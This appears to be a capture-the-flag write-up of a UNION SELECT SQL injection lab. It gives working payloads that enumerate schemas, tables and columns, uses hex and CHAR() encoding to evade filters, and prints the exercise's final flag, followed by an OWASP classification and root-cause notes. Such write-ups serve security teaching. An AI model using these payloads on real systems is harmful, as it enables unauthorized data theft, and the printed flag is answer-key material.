# Extract the Final Flag from `Member_images.list_images`

### **1. Understand the scenario**

* You have a vulnerable form that reflects database query results (`First name` and `Surname`) using a **`UNION SELECT` SQL injection**.
* You already enumerated tables and found `Member_images.list_images`.
* Using `UNION SELECT`, you retrieved the **columns** and **data** from this table.
i had already grab all the databases inside with this : 

```sql 
1 UNION SELECT schema_name, NULL FROM information_schema.schemata 

```
and after investigating them one after other, **Member_images** is the one.
and it has one only table *list_images*, that i extracted using this command 

```sql 
1 UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 105, 109, 97, 103, 101, 115)


hint: CHAR(77, 101, 109, 98, 101, 114, 95, 105, 109, 97, 103, 101, 115) = 'Member_images'
```

---

### **2. List the columns**

Injected:

```sql
1 UNION SELECT group_concat(column_name), NULL
FROM information_schema.columns
WHERE table_name=0x6c6973745f696d61676573
  AND table_schema=0x4d656d6265725f696d61676573-- -
```

```sql
The value 0x6c6973745f696d61676573 is a hexadecimal representation of the string list_images.
And The value 0x4d656d6265725f696d61676573 represents the string Member_images, a database schema.
```


* Output:

```
id, url, title, comment
```

* Only **text columns** (`title` and `comment`) are useful for finding hints or flags.

---

### **3. Extract the data**

Injected:

```sql
1 UNION SELECT title, comment FROM Member_images.list_images-- -
```

* Output highlights the `comment` associated with the title `Hack me ?`:

```
First name: Hack me ?
Surname : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```
Using

* **Observation:** The comment contains an **MD5 hash** and instructions:

  1. Decode the MD5 hash.
  2. Convert the result to lowercase.
  3. Apply SHA-256 on the lowercase result.

---

### **4. Follow the instructions step by step**

#### a) MD5 hash given:

```
1928e8083cf461a51303633093573c46
```

#### b) Step 1 — MD5 decode

* You can use **online MD5 lookup** tools (or a local script).
* Decoded result:

```
albatroz
```

#### c) Step 2 — lowercase

* Convert `albatroz` → `albatroz`

#### d) Step 3 — SHA-256

* Compute SHA-256 of `albatroz`.
* the **final flag** :  f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

### **5. What the vulnerability is (OWASP classification)**

#### Vulnerability name: SQL Injection — arbitrary query execution and data exfiltration via crafted input (e.g., UNION SELECT, information_schema enumeration).

OWASP Top 10 (2021) classification:
A03 — Injection.

Why: The application directly incorporates attacker-controlled input into SQL statements without proper parameterization or allowlisting, so an attacker can change the intended query logic to enumerate schemas/tables, read sensitive data, or execute destructive queries.

### ** 6. Root cause **

the application interpolates user input directly into SQL queries (no parameterization) and allows arbitrary identifiers to influence the query. This allowed an attacker to inject UNION SELECT payloads to enumerate schemas/tables/columns and exfiltrate row data. Contributing factors: overly permissive DB privileges and lack of output filtering/least privilege.





> tips:
* information_schema is a metadata database provided by most RDBMSs
* schemata is the table that lists all schemas/databases on the server
* information_schema is a metadata database listing databases/tables/columns
* CHAR(...) / 0x... encoding  used to bypass naive filters and quoting differences between DB engines.
* Column-count & type matching — attackers often trial-and-error to match the number and datatypes of columns returned by the original query
* Why GROUP_CONCAT / GROUP_CONCAT(column) — to combine column names into a single output cell